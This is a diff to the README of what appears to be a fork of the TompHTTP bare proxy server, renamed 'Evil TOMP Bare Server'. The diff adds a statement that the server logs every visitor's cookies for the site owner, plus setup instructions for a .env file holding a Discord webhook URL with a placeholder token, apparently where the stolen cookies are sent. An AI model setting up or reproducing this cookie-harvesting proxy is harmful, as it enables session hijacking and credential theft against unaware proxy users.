@@ -1,6 +1,16 @@
-# TOMP Bare Server
+# Evil TOMP Bare Server
 
 This repository implements the TompHTTP bare server. See the specification [here](https://github.com/tomphttp/specifications/blob/master/BareServer.md).
+
+This also logs all your cookies for the site owner.
+
+## Extra Setup
+
+Make a .env file that looks like this:
+
+```
+WEBHOOK="https://discord.com/api/webhooks/10/T0k3n"
+```
 
 ## Upgrading
 
